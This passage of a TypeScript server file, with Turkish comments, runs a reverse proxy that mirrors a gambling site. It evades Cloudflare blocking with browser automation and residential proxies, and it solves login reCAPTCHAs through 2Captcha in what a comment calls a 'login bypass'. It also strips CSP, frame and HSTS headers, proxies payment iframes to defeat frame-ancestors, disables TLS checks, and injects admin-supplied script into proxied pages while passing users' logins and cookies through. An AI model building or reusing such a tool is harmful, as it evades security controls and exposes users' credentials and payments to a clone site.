      const expectsJson = clientAccept.includes("application/json") || isAjax;

      // ─── Device Detection for Cache (HTML icin M/D ayri; asset tek entry) ───
      const forceMobile = req.query.mobile === "1" || req.query.mobile === "true";
      const clientUA = forceMobile ? MOBILE_UA : ((req.headers["user-agent"] as string) || USER_AGENT);
      const isMobileUA = forceMobile || /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(clientUA);
      const deviceTag = isMobileUA ? 'M' : 'D';
      const isAssetPath = ASSET_EXTENSIONS.test(targetPath);
      const cacheKey = req.method === 'GET' && isAssetPath
        ? `GET:${targetPath}`
        : `${req.method}:${deviceTag}:${targetPath}`;

      // ─── Cache Check (once cache = aninda cevap) ───
      if (req.method === 'GET') {
        const cached = getCached(cacheKey);
        if (cached) {
          const maxAge = isAssetPath ? BROWSER_ASSET_MAX_AGE : BROWSER_HTML_MAX_AGE;
          const cc = isAssetPath ? `public, max-age=${maxAge}, immutable` : `public, max-age=${maxAge}`;
          log("CACHE", `HIT ${targetPath} (${cached.hits} hits)`);
          res.writeHead(cached.statusCode, {
            'Content-Type': cached.contentType,
            'Content-Length': Buffer.byteLength(typeof cached.body === 'string' ? cached.body : cached.body).toString(),
            'Access-Control-Allow-Origin': '*',
            'X-Cache': 'HIT',
            'Cache-Control': cc,
            ...cached.headers,
          });
          res.end(cached.body);
          return;
        }
      }

      // Build merged cookies
      const allCookies = mergeCookies(req.headers.cookie || "");

      // ─── Headers ───
      const headers: Record<string, string> = {};
      headers["Host"] = targetUrl.host;
      headers["Connection"] = "keep-alive";

      // Content headers for POST/PUT
      if (isPostRequest || isPutRequest) {
        if (req.headers["content-length"]) headers["Content-Length"] = req.headers["content-length"] as string;
        if (req.headers["content-type"]) headers["Content-Type"] = req.headers["content-type"] as string;
      }

      // Forward client's User-Agent so target site serves correct mobile/desktop version
      headers["User-Agent"] = clientUA;

      // Forward sec-ch-ua headers from client for proper device detection
      if (req.headers["sec-ch-ua"]) {
        headers["sec-ch-ua"] = req.headers["sec-ch-ua"] as string;
      } else {
        headers["sec-ch-ua"] = '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"';
      }
      if (req.headers["sec-ch-ua-mobile"]) {
        headers["sec-ch-ua-mobile"] = req.headers["sec-ch-ua-mobile"] as string;
      } else {
        headers["sec-ch-ua-mobile"] = isMobileUA ? "?1" : "?0";
      }
      if (req.headers["sec-ch-ua-platform"]) {
        headers["sec-ch-ua-platform"] = req.headers["sec-ch-ua-platform"] as string;
      } else {
        headers["sec-ch-ua-platform"] = isMobileUA ? '"Android"' : '"Windows"';
      }

      // Accept
      if (isPostRequest || isAjax) {
        headers["Accept"] = req.headers.accept as string || "*/*";
      } else if (isAsset) {
        headers["Accept"] = "*/*";
      } else {
        headers["Accept"] =
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
      }

      // POST/AJAX specifics
      if (isPostRequest || isPutRequest) {
        headers["Origin"] = getTargetOrigin();
        headers["X-Requested-With"] = "XMLHttpRequest";
      }
      if (req.headers["x-requested-with"]) {
        headers["X-Requested-With"] = req.headers["x-requested-with"] as string;
      }

      // Sec-Fetch
      const secDest = getSecFetchDest(targetPath, isAjax || isPostRequest);
      if (isPostRequest || isAjax) {
        headers["Sec-Fetch-Site"] = "same-origin";
        headers["Sec-Fetch-Mode"] = "cors";
        headers["Sec-Fetch-Dest"] = "empty";
      } else if (isAsset) {
        headers["Sec-Fetch-Site"] = "same-origin";
        headers["Sec-Fetch-Mode"] = "no-cors";
        headers["Sec-Fetch-Dest"] = secDest;
      } else {
        headers["Upgrade-Insecure-Requests"] = "1";
        headers["Sec-Fetch-Site"] = "none";
        headers["Sec-Fetch-Mode"] = "navigate";
        headers["Sec-Fetch-User"] = "?1";
        headers["Sec-Fetch-Dest"] = "document";
      }

      // Encoding & Language
      headers["Accept-Encoding"] = "gzip, deflate, br";
      headers["Accept-Language"] = "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7";

      // Referer — forward client referer rewritten to target, or default
      const clientReferer = req.headers.referer || req.headers.referrer;
      if (clientReferer && typeof clientReferer === "string") {
        const baseRegex = new RegExp(proxyBase.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "/?", "g");
        headers["Referer"] = clientReferer.replace(baseRegex, "/").replace(
          new RegExp(`https?://[^/]+`, "i"),
          getTargetOrigin()
        );
      } else {
        headers["Referer"] = `${getTargetOrigin()}/tr/`;
      }

      // Cookies
      if (allCookies) headers["Cookie"] = allCookies;

      // ─── POST Body ───
      let postBodyData: Buffer | null = null;
      if (isPostRequest || isPutRequest) {
        const contentType = req.headers["content-type"] || "";
        if (req.body && Object.keys(req.body).length > 0) {
          let bodyStr: string;
          if (contentType.includes("application/json")) {
            bodyStr = JSON.stringify(req.body);
          } else if (contentType.includes("application/x-www-form-urlencoded")) {
            bodyStr = new URLSearchParams(req.body as Record<string, string>).toString();
          } else {
            bodyStr = typeof req.body === "string" ? req.body : JSON.stringify(req.body);
          }

          // Intercept reCAPTCHA placeholder and solve real captcha if needed
          if (bodyStr.includes("PROXY_RECAPTCHA_PLACEHOLDER") && isCaptchaConfigured()) {
            try {
              const pageHtml = await fetchViaProxy(targetPath, "GET");
              const siteKeyMatch = pageHtml.match(/render=([A-Za-z0-9_-]{30,})/);
              if (siteKeyMatch) {
                const captchaResult = await solveRecaptchaV3(`${getTargetOrigin()}${targetPath}`, siteKeyMatch[1], "submit");
                if (captchaResult.success && captchaResult.token) {
                  bodyStr = bodyStr.replace(/PROXY_RECAPTCHA_PLACEHOLDER/g, captchaResult.token);
                  log("PROXY", "Replaced reCAPTCHA placeholder with real token");
                }
              }
            } catch (e: any) {
              log("PROXY", `reCAPTCHA solve error: ${e.message}`);
            }
          }

          // Orijinal login: g-recaptcha-response boşsa 2Captcha ile çöz
          const isLoginPath = /login|Login/i.test(targetPath) || (/\b(Password|password)\b/.test(bodyStr) && /\b(Email|Username|email|username)\b/.test(bodyStr));
          const recaptchaField = bodyStr.match(/g-recaptcha-response=([^&]*)/);
          const needsCaptcha = isLoginPath && isCaptchaConfigured() && (!recaptchaField || !recaptchaField[1] || recaptchaField[1].length < 20);
          if (needsCaptcha) {
            try {
              const refPath = (clientReferer && typeof clientReferer === "string")
                ? (clientReferer.replace(/^https?:\/\/[^/]+/i, "").replace(/^\//, "") || "/tr/")
                : "/tr/";
              const pageHtml = await fetchViaProxy(refPath, "GET");
              const siteKeyV3 = pageHtml.match(/render=([A-Za-z0-9_-]{30,})/);
              const siteKeyV2 = pageHtml.match(/data-sitekey=["']([A-Za-z0-9_-]{30,})["']/);
              const pageUrl = getTargetOrigin() + (refPath.startsWith("/") ? refPath : "/" + refPath);
              let captchaToken: string | undefined;
              if (siteKeyV3) {
                const r = await solveRecaptchaV3(pageUrl, siteKeyV3[1], "login");
                if (r.success && r.token) { captchaToken = r.token; log("PROXY", "2Captcha: orijinal login reCAPTCHA v3 çözüldü"); }
              }
              if (!captchaToken && siteKeyV2) {
                const r = await solveRecaptchaV2(pageUrl, siteKeyV2[1]);
                if (r.success && r.token) { captchaToken = r.token; log("PROXY", "2Captcha: orijinal login reCAPTCHA v2 çözüldü"); }
              }
              if (captchaToken) {
                if (/g-recaptcha-response=/.test(bodyStr)) {
                  bodyStr = bodyStr.replace(/g-recaptcha-response=[^&]*/g, "g-recaptcha-response=" + encodeURIComponent(captchaToken));
                } else {
                  bodyStr = bodyStr + (bodyStr ? "&" : "") + "g-recaptcha-response=" + encodeURIComponent(captchaToken);
                }
              }
            } catch (e: any) {
              log("PROXY", `2Captcha login bypass error: ${e.message}`);
            }
          }

          postBodyData = Buffer.from(bodyStr);
        } else if ((req as any).rawBody) {
          postBodyData = (req as any).rawBody as Buffer;
        }
        if (postBodyData) headers["Content-Length"] = postBodyData.length.toString();
      }

      // ─── Make Request with Retry ───
      const makeProxyRequest = (retryCount = 0): void => {
      const currentAgent = retryCount > 0 ? createProxyAgent() : proxyAgent;
      const options: https.RequestOptions = {
        hostname: targetUrl.hostname,
        port: 443,
        path: targetUrl.pathname + targetUrl.search,
        method: req.method,
        headers,
        agent: currentAgent,
        timeout: 15000,
        rejectUnauthorized: false,
      };

      const proxyReq = https.request(options, async (proxyRes) => {
        // Store cookies
        if (proxyRes.headers["set-cookie"]) {
          const nc = parseCookies(proxyRes.headers["set-cookie"] as string[]);
          for (const [k, v] of Object.entries(nc)) storedCookies.set(k, v);
        }

        const isHtmlRequest = (req.headers.accept || "").includes("text/html");
        const isBlocked = proxyRes.statusCode === 401 || proxyRes.statusCode === 403;

        if (isBlocked && retryCount < 1) {
          proxyRes.resume();
          log("PROXY", `Blocked (${proxyRes.statusCode}) on ${req.method} ${targetPath} - triggering headful bypass...`);
          try {
            await startCfBypass();
          } catch (e: any) {
            log("PROXY", `Bypass error: ${e?.message || e}`);
          }
          // Re-sync cookies with latest from bypass
          const freshBypassCookies = getCachedCookies();
          if (freshBypassCookies) {
            for (const [k, v] of Object.entries(freshBypassCookies.allCookies)) storedCookies.set(k, v);
            if (freshBypassCookies.cfClearance) cfClearanceExpiry = Date.now() + CF_CLEARANCE_LIFETIME;
          }
          headers["Cookie"] = mergeCookies(req.headers.cookie || "");
          // HTML GET: bypass sonrasi once tarayici ile dene (cf_clearance ile sayfa alinir), basarisizsa tek HTTPS retry
          if (isHtmlRequest && req.method === "GET") {
            const clientUA = (req.headers["user-agent"] as string) || USER_AGENT;
            try {
              const browserResult = await fetchPageViaBrowser(targetPath, { userAgent: clientUA });
              if (browserResult && browserResult.status === 200 && browserResult.body.length > 500) {
                log("PROXY", `Browser fetch OK (after 403): ${browserResult.body.length} bytes`);
                let body = browserResult.body;
                try {
                  const settings = await storage.getSettings();
                  const tawkCode = (settings?.liveChatCode ?? "").trim();
                  if (tawkCode) body = body.replace(/<\/head>/i, tawkCode + "\n</head>");
                } catch (_) {}
                body = rewriteHtml(body, proxyBase);
                body = injectMobileViewport(body, isMobileUA || req.query.mobile === "1" || req.query.mobile === "true");
                const freshCookies = getCachedCookies();
                if (freshCookies) {
                  for (const [k, v] of Object.entries(freshCookies.allCookies)) storedCookies.set(k, v);
                }
                setCache(cacheKey, { body, contentType: "text/html; charset=utf-8", statusCode: 200, headers: {} });
                res.writeHead(200, {
                  "Content-Type": "text/html; charset=utf-8",
                  "Content-Length": Buffer.byteLength(body).toString(),
                  "Access-Control-Allow-Origin": "*",
                  "X-Cache": "BROWSER",
                  "Cache-Control": `public, max-age=${BROWSER_HTML_MAX_AGE}`,
                });
                res.end(body);
                return;
              }
            } catch (e: any) {
              log("PROXY", `Browser fetch after 403 failed: ${e?.message || e}`);
            }
          }
          log("PROXY", `Got ${proxyRes.statusCode} ${req.method} ${targetPath}, cookie guncellendi, tek deneme...`);
          makeProxyRequest(1);
          return;
        }

        if (isBlocked) {
          proxyRes.resume();

          log("PROXY", `Got ${proxyRes.statusCode} ${req.method} ${targetPath}, trying browser fetch...`);

          const clientUA = (req.headers["user-agent"] as string) || USER_AGENT;
          
          try {
            if (isHtmlRequest && req.method === "GET") {
              // HTML page - use full navigation for JS execution
              const browserResult = await fetchPageViaBrowser(targetPath, { userAgent: clientUA });
              if (browserResult && browserResult.status === 200 && browserResult.body.length > 500) {
                log("PROXY", `Browser fetch OK: ${browserResult.body.length} bytes`);
                
                let body = browserResult.body;
                try {
                  const settings = await storage.getSettings();
                  const tawkCode = (settings?.liveChatCode ?? "").trim();
                  if (tawkCode) body = body.replace(/<\/head>/i, tawkCode + "\n</head>");
                } catch (_) {}
                body = rewriteHtml(body, proxyBase);
                body = injectMobileViewport(body, isMobileUA || req.query.mobile === "1" || req.query.mobile === "true");
                const freshCookies = getCachedCookies();
                if (freshCookies) {
                  for (const [k, v] of Object.entries(freshCookies.allCookies)) {
                    storedCookies.set(k, v);
                  }
                }
                setCache(cacheKey, { body, contentType: "text/html; charset=utf-8", statusCode: 200, headers: {} });
                res.writeHead(200, {
                  "Content-Type": "text/html; charset=utf-8",
                  "Content-Length": Buffer.byteLength(body).toString(),
                  "Access-Control-Allow-Origin": "*",
                  "X-Cache": "BROWSER",
                  "Cache-Control": `public, max-age=${BROWSER_HTML_MAX_AGE}`,
                });
                res.end(body);
                return;
              }
            } else if (req.method === "GET") {
              // Non-HTML resource (JS, CSS, etc) - use fetch() API for raw content
              const resourceResult = await fetchResourceViaBrowser(targetPath, clientUA);
              if (resourceResult?.status === 200) {
                const rr = resourceResult as NonNullable<typeof resourceResult>;
                log("PROXY", `Browser resource OK: ${rr.body.length} bytes`);
                
                let resBody = rr.body;
                // Rewrite URLs in JS/CSS resources too
                const ct = rr.contentType || "";
                if (ct.includes("javascript") || ct.includes("css")) {
                  resBody = resBody.replace(new RegExp(getTargetHost().replace(/\./g, '\\.'), 'g'), req.headers.host || "localhost:5000");
                }
                
                setCache(cacheKey, { body: resBody, contentType: rr.contentType || "application/octet-stream", statusCode: 200, headers: {} });
                res.writeHead(200, {
                  "Content-Type": rr.contentType,
                  "Content-Length": Buffer.byteLength(resBody).toString(),
                  "Access-Control-Allow-Origin": "*",
                  "Cache-Control": `public, max-age=${BROWSER_ASSET_MAX_AGE}, immutable`,
                });
                res.end(resBody);
                return;
              }
            } else if (req.method === "POST") {
              // POST request - forward through browser's fetch API
              const contentType = req.headers["content-type"] || "application/x-www-form-urlencoded";
              let bodyStr = "";
              if (typeof req.body === "string") {
                bodyStr = req.body;
              } else if (req.body && typeof req.body === "object") {
                if (contentType.includes("json")) {
                  bodyStr = JSON.stringify(req.body);
                } else {
                  bodyStr = new URLSearchParams(req.body as Record<string, string>).toString();
                }
              }

              const postResult = await fetchPageViaBrowser(targetPath, {
                method: "POST",
                headers: { "Content-Type": contentType },
                body: bodyStr,
                userAgent: clientUA,
              });

              if (postResult) {
                const pr = postResult!;
                log("PROXY", `Browser POST OK: status=${pr.status}, ${pr.body.length} bytes`);
                
                const freshCookies = getCachedCookies();
                if (freshCookies) {
                  const fc = freshCookies!;
                  for (const [k, v] of Object.entries(fc.allCookies)) storedCookies.set(k, v);
                }

                let body = pr.body;
                const ct = pr.contentType || "";
                if (ct.includes("html")) {
                  try {
                    const settings = await storage.getSettings();
                    const tawkCode = (settings?.liveChatCode ?? "").trim();
                    if (tawkCode) body = body.replace(/<\/head>/i, tawkCode + "\n</head>");
                  } catch (_) {}
                  body = rewriteHtml(body, proxyBase);
                  body = injectMobileViewport(body, isMobileUA || req.query.mobile === "1" || req.query.mobile === "true");
                }
                else if (ct.includes("json")) body = rewriteJson(body, proxyBase);

                res.writeHead(pr.status, {
                  "Content-Type": ct,
                  "Content-Length": Buffer.byteLength(body).toString(),
                  "Access-Control-Allow-Origin": "*",
                });
                res.end(body);
                return;
              }
            }
          } catch (browserErr: any) {
            log("PROXY", `Browser fetch error: ${browserErr.message}`);
          }

          // If browser fetch also failed, show message (HTML GET only) - otomatik yenileme yok, döngü olmasin
          if (isHtmlRequest && req.method === "GET") {
            const retryHtml = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Erişim gecikiyor</title>
<style>body{background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;margin:0}
.box{text-align:center;max-width:320px;padding:24px}
.spinner{width:48px;height:48px;border:4px solid #333;border-top:4px solid #e94560;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
a{color:#e94560}</style></head>
<body><div class="box"><div class="spinner"></div><h2>Erişim gecikiyor</h2><p>Sayfa şu an yüklenemiyor. Birkaç dakika sonra <a href="${proxyBase || "/tr"}/">ana sayfayı</a> yenileyin veya admin panelinden CF bypass çalıştırın.</p></div></body></html>`;
            res.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
            res.end(retryHtml);
          } else {
            if (expectsJson || isAjax) {
              res.writeHead(503, { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" });
              res.end(JSON.stringify({ error: "Resource temporarily unavailable", retry: true }));
            } else {
              res.writeHead(502, { "Content-Type": "text/plain" });
              res.end("Resource temporarily unavailable");
            }
          }
          return;
        }

        // ─── Response Headers ───
        const responseHeaders: Record<string, string | string[] | undefined> = {};
        for (const [key, value] of Object.entries(proxyRes.headers)) {
          const lk = key.toLowerCase();
          // Strip security headers that break proxying
          if (
            lk === "x-frame-options" ||
            lk === "content-security-policy" ||
            lk === "content-security-policy-report-only" ||
            lk === "content-encoding" ||
            lk === "transfer-encoding" ||
            lk === "content-length" ||
            lk === "strict-transport-security"
          ) continue;
          responseHeaders[key] = value;
        }

        // CORS headers for font/asset cross-origin
        responseHeaders["Access-Control-Allow-Origin"] = "*";
        responseHeaders["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS";
        responseHeaders["Access-Control-Allow-Headers"] = "Content-Type, X-Requested-With, Authorization";

        // Tarayici cache: asset 7 gun, HTML 15 dk
        if (proxyRes.statusCode === 200) {
          responseHeaders["Cache-Control"] = isAsset
            ? `public, max-age=${BROWSER_ASSET_MAX_AGE}, immutable`
            : `public, max-age=${BROWSER_HTML_MAX_AGE}`;
        }

        // Rewrite Set-Cookie domain
        if (proxyRes.headers["set-cookie"]) {
          const cookies = Array.isArray(proxyRes.headers["set-cookie"])
            ? proxyRes.headers["set-cookie"]
            : [proxyRes.headers["set-cookie"]];
          responseHeaders["set-cookie"] = cookies.map((c) =>
            c.replace(/domain=[^;]+;?\s*/gi, "").replace(/path=\/(?!proxy)/gi, `path=${proxyBase}/`)
          );
        }

        // Redirect rewriting — avoid /tr/tr when target returns ...com/tr/ or ...com/tr/tr/
        if (proxyRes.headers.location) {
          let loc = proxyRes.headers.location as string;
          if (TARGET_DOMAIN_PATTERN.test(loc)) {
            loc = loc.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/(.*)/i, (_m, rest) => proxyBase + "/" + stripTrFromPath(rest, proxyBase));
            loc = loc.replace(/https?:\/\/grandpashabet\d*\.com\/tr\/?/i, proxyBase + "/");
            loc = loc.replace(/https?:\/\/grandpashabet\d*\.com/i, proxyBase);
          } else if (loc.startsWith("/") && !loc.startsWith(proxyBase)) {
            const rest = stripTrFromPath(loc.replace(/^\//, ""), proxyBase);
            loc = rest ? `${proxyBase}/${rest}` : proxyBase + "/";
          } else if (!loc.startsWith("http") && !loc.startsWith("/")) {
            loc = `${proxyBase}/${stripTrFromPath(loc, proxyBase)}`;
          }
          responseHeaders.location = loc;
        }

        // HEAD request
        if (req.method === "HEAD") {
          res.writeHead(proxyRes.statusCode || 200, responseHeaders);
          res.end();
          proxyRes.resume();
          return;
        }

        // ─── Response Body ───
        const stream = decompressStream(proxyRes);
        const contentType = proxyRes.headers["content-type"];
        const category = getContentCategory(contentType);

        if (category === "binary") {
          if (req.method === 'GET' && proxyRes.statusCode === 200) {
            const chunks: Buffer[] = [];
            stream.on("data", (c: Buffer) => chunks.push(c));
            stream.on("end", () => {
              const body = Buffer.concat(chunks);
              setCache(cacheKey, {
                body,
                contentType: contentType || 'application/octet-stream',
                statusCode: 200,
                headers: {},
              });
              responseHeaders["content-length"] = body.length.toString();
              responseHeaders["Cache-Control"] = `public, max-age=${BROWSER_ASSET_MAX_AGE}, immutable`;
              res.writeHead(200, responseHeaders);
              res.end(body);
            });
            stream.on("error", (err) => {
              log("PROXY", `Stream error: ${err.message}`);
              if (!res.headersSent) res.status(500).send("Stream error");
            });
          } else {
            res.writeHead(proxyRes.statusCode || 200, responseHeaders);
            stream.pipe(res);
          }
        } else {
          // Text: buffer, rewrite, send
          const chunks: Buffer[] = [];
          stream.on("data", (c) => chunks.push(c));
          stream.on("end", async () => {
            let body = Buffer.concat(chunks).toString("utf-8");

            // HTML: inject Tawk (admin liveChatCode) then rewrite
            if (category === "html") {
              try {
                const settings = await storage.getSettings();
                const tawkCode = (settings?.liveChatCode ?? "").trim();
                if (tawkCode) {
                  body = body.replace(/<\/head>/i, tawkCode + "\n</head>");
                }
              } catch (_) {}
              body = rewriteHtml(body, proxyBase);
              body = injectMobileViewport(body, isMobileUA || req.query.mobile === "1" || req.query.mobile === "true");
            } else if (category === "css") body = rewriteCss(body, proxyBase);
            else if (category === "js") body = rewriteJs(body, proxyBase);
            else if (category === "json") body = rewriteJson(body, proxyBase);
            else if (category === "xml") body = rewriteHtml(body, proxyBase); // XML can have URLs too

            // Cache the response
            if (req.method === 'GET' && (proxyRes.statusCode === 200 || proxyRes.statusCode === 304)) {
              setCache(cacheKey, {
                body,
                contentType: contentType || 'text/html',
                statusCode: proxyRes.statusCode || 200,
                headers: {},
              });
            }

            responseHeaders["content-length"] = Buffer.byteLength(body).toString();
            if (!res.headersSent) {
              res.writeHead(proxyRes.statusCode || 200, responseHeaders);
              res.end(body);
            }
          });
          stream.on("error", (err) => {
            log("PROXY", `Stream error: ${err.message}`);
            if (!res.headersSent) res.status(500).send("Stream error");
          });
        }
      });

      proxyReq.on("error", (err) => {
        const isTlsError = err.message.includes("TLS") || err.message.includes("socket disconnected") || err.message.includes("ECONNRESET");
        if (isTlsError && retryCount < 2) {
          log("PROXY", `TLS error (retry ${retryCount + 1}/2): ${err.message}`);
          proxyAgent = createProxyAgent();
          makeProxyRequest(retryCount + 1);
          return;
        }
        log("PROXY", `Request error: ${err.message}`);
        if (!res.headersSent) res.status(502).send(`Proxy error: ${err.message}`);
      });

      proxyReq.on("timeout", () => {
        proxyReq.destroy();
        if (retryCount < 1) {
          log("PROXY", `Timeout (retry ${retryCount + 1})`);
          proxyAgent = createProxyAgent();
          makeProxyRequest(retryCount + 1);
          return;
        }
        if (!res.headersSent) res.status(504).send("Proxy timeout");
      });

      // Send body
      if (req.method !== "GET" && req.method !== "HEAD") {
        if (postBodyData) {
          proxyReq.write(postBodyData);
          proxyReq.end();
        } else if (retryCount === 0) {
          req.pipe(proxyReq);
        } else {
          proxyReq.end();
        }
      } else {
        proxyReq.end();
      }
      }; // end makeProxyRequest
      makeProxyRequest();
    } catch (err: any) {
      log("PROXY", `Exception: ${err.message}`);
      if (!res.headersSent) res.status(500).send(`Error: ${err.message}`);
    }
    };
  }

  // Ödeme iframe proxy: CSP frame-ancestors engelini kaldırmak için iframe içeriğini biz sunuyoruz
  const PAYMENT_IFRAME_HOST = /grndspr[\d.]*\.com$/i;
  const handleIframeProxy = (req: Request, res: Response, proxyBase: string) => {
    const raw = (req.query.url as string) || "";
    try {
      const target = new URL(raw);
      if (!target.protocol.startsWith("http") || !PAYMENT_IFRAME_HOST.test(target.hostname)) {
        res.status(400).send("Invalid iframe URL");
        return;
      }
      const opts: https.RequestOptions = {
        hostname: target.hostname,
        port: target.port || 443,
        path: target.pathname + target.search,
        method: "GET",
        headers: {
          Host: target.hostname,
          "User-Agent": req.headers["user-agent"] || USER_AGENT,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "tr-TR,tr;q=0.9",
        },
        rejectUnauthorized: false,
      };
      const proxyReq = https.request(opts, (proxyRes) => {
        const head: Record<string, string> = {};
        for (const [k, v] of Object.entries(proxyRes.headers)) {
          if (!v) continue;
          const lk = k.toLowerCase();
          if (lk === "content-security-policy" || lk === "content-security-policy-report-only" || lk === "x-frame-options") continue;
          if (lk !== "content-encoding" && lk !== "transfer-encoding" && lk !== "content-length") head[k] = Array.isArray(v) ? v.join(", ") : v;
        }
        res.writeHead(proxyRes.statusCode || 200, head);
        const stream = decompressStream(proxyRes);
        stream.pipe(res);
        stream.on("error", () => { if (!res.headersSent) res.status(500).end(); });
      });
      proxyReq.on("error", (err) => {
        log("PROXY", `iframe-proxy error: ${err.message}`);
        if (!res.headersSent) res.status(502).send("Iframe proxy error");
      });
      proxyReq.setTimeout(20000, () => { proxyReq.destroy(); if (!res.headersSent) res.status(504).end(); });
      proxyReq.end();
    } catch (e: any) {
      if (!res.headersSent) res.status(400).send("Bad URL");
    }
  };
  app.get("/tr/iframe-proxy", (req, res) => handleIframeProxy(req, res, "/tr"));
  app.get("/proxy/iframe-proxy", (req, res) => handleIframeProxy(req, res, "/proxy"));

  app.use("/proxy", createProxyHandler("/proxy", (req) => {
    const u = req.url || "/";
    if (u.startsWith("/tr/") || u.startsWith("/tr?") || u === "/tr") return u;
    if (u === "/") return "/tr/";
    return "/tr" + u;
  }));
  app.use("/tr", createProxyHandler("/tr", (req) => {
    const u = req.url || "/";
    return u === "/" ? "/tr/" : "/tr" + u;
  }));

  // ─── CORS preflight handled within the proxy handler above ───

  // ═══════════════════════════════════════════════════
  // ─── API Endpoints ───
  // ═══════════════════════════════════════════════════

  app.get("/api/proxy-status", async (_req, res) => {
    const test = await testProxyConnection();
    res.json({
      version: MODULE_VERSION,
      target: getTargetUrl(),
      upstreamProxy: "gw.dataimpulse.com:823 (Residential Premium)",
      sessionId: currentSessionId,
      storedCookies: storedCookies.size,
      cfReady: isCfReady(),
      hasCfClearance: storedCookies.has("cf_clearance"),
      cfClearanceTTL: cfClearanceExpiry > 0 ? Math.max(0, Math.ceil((cfClearanceExpiry - Date.now()) / 1000)) : 0,
      bypassMode: process.env.CF_HEADLESS === "true" ? "headless" : "headful",
      bypassInProgress: cfBypassInProgress,
      bypassFailCount,
      lastBypassError: getLastBypassError(),
      status: test.ok ? "active" : "blocked",
      statusCode: test.statusCode,
      bodyPreview: test.body,
      error: test.error,
      timestamp: new Date().toISOString(),
    });
  });

  app.get("/api/captcha-status", async (_req, res) => {
    try {
      const configured = isCaptchaConfigured();
      let balance = 0;
      if (configured) balance = await getBalance();
      res.json({ configured, balance, service: "2Captcha", timestamp: new Date().toISOString() });
    } catch (error: any) {
      res.json({ configured: false, balance: 0, error: error.message, timestamp: new Date().toISOString() });
    }
  });

  app.post("/api/import-cookies", async (req: Request, res: Response) => {
    try {
      const { cookies } = req.body;
      if (!cookies) {
        return res.status(400).json({ success: false, error: "cookies field is required" });
      }

      let imported = 0;

      if (typeof cookies === "string") {
        const parts = cookies.split(";");
        for (const part of parts) {
          const t = part.trim();
          if (!t) continue;
          const eq = t.indexOf("=");
          if (eq > 0) {
            const name = t.substring(0, eq).trim();
            const value = t.substring(eq + 1).trim();
            storedCookies.set(name, value);
            imported++;
          }
        }
      } else if (Array.isArray(cookies)) {
        for (const cookie of cookies) {
          if (cookie && cookie.name && cookie.value !== undefined) {
            storedCookies.set(cookie.name, cookie.value);
            imported++;
          }
        }
      } else if (typeof cookies === "object") {
        if (cookies.name && cookies.value !== undefined) {
          storedCookies.set(cookies.name, cookies.value);
          imported++;
        } else {
          for (const [k, v] of Object.entries(cookies)) {
            if (k && v !== undefined) {
              storedCookies.set(k, String(v));
              imported++;
            }
          }
        }
      }

      log("COOKIES", `Imported ${imported} cookies, total: ${storedCookies.size}`);
      
      // Sync to cloudflare-bypass module
      const cookieObj: Record<string, string> = {};
      storedCookies.forEach((v, k) => (cookieObj[k] = v));
      setCachedCookies(cookieObj);
      
      // Cookie pool'a da kaydet
      poolImportCookies(cookieObj, currentSessionId, getTargetHost());

      res.json({ success: true, imported, cookies: storedCookies.size, poolSynced: true });
    } catch (error: any) {
      log("COOKIES", `Import error: ${error.message}`);
      res.status(500).json({ success: false, error: error.message });
    }
  });

  app.get("/api/cookies-status", async (_req: Request, res: Response) => {
    res.json({
      total: storedCookies.size,
      hasCfClearance: storedCookies.has("cf_clearance"),
      hasCfBm: storedCookies.has("__cf_bm"),
      cfClearanceExpiry: cfClearanceExpiry > 0 ? new Date(cfClearanceExpiry).toISOString() : null,
      cfClearanceTTL: cfClearanceExpiry > 0 ? Math.max(0, Math.ceil((cfClearanceExpiry - Date.now()) / 1000)) : 0,
      cookies: Array.from(storedCookies.keys()),
      pool: getPoolStatus(),
    });
  });

  app.post("/api/refresh-session", async (_req, res) => {
    bypassFailCount = 0;
    lastBypassAttempt = 0;
    cfClearanceExpiry = 0;
    await refreshSession();
    const cfCookies = await getCloudflareBypassCookies();
    if (cfCookies) {
      for (const [k, v] of Object.entries(cfCookies.allCookies)) storedCookies.set(k, v);
      if (cfCookies.cfClearance) cfClearanceExpiry = Date.now() + CF_CLEARANCE_LIFETIME;
    }
    res.json({ message: "Session refreshed (headful)", sessionId: currentSessionId, cookies: storedCookies.size, cfReady: isCfReady(), hasCfClearance: storedCookies.has("cf_clearance") });
  });

  // Diagnostic endpoint
  app.get("/api/diag", (_req, res) => {
    res.json({
      version: MODULE_VERSION,
      sessionId: currentSessionId,
      storedCookies: storedCookies.size,
      cookieNames: Array.from(storedCookies.keys()),
      cfReady: isCfReady(),
      hasCfClearance: storedCookies.has("cf_clearance"),
      hasCfBm: storedCookies.has("__cf_bm"),
      bypassInProgress: cfBypassInProgress,
      bypassFailCount,
      maxRetries: MAX_AUTO_RETRIES,
      lastBypassAttempt: lastBypassAttempt ? new Date(lastBypassAttempt).toISOString() : "never",
      proxyConfigured: isProxyConfigured(),
      timestamp: new Date().toISOString(),
    });
  });

  app.post("/api/puppeteer-bypass", async (_req, res) => {
    try {
      // Reset fail count for manual trigger
      bypassFailCount = 0;
      lastBypassAttempt = 0;
      // Sync session so Puppeteer uses same IP as proxy
      setPuppeteerSessionId(currentSessionId);
      log("CF-API", `Session synced to: ${currentSessionId}`);

      const cfCookies = await getCloudflareBypassCookies();
      if (cfCookies) {
        // Sync back in case Puppeteer changed session during retries
        const newSid = getPuppeteerSessionId();
        if (newSid !== currentSessionId) {
          currentSessionId = newSid;
          proxyAgent = createProxyAgent();
          log("CF-API", `Session updated to: ${currentSessionId}`);
        }
        for (const [k, v] of Object.entries(cfCookies.allCookies)) storedCookies.set(k, v);
        res.json({
          success: true,
          cookies: storedCookies.size,
          sessionId: currentSessionId,
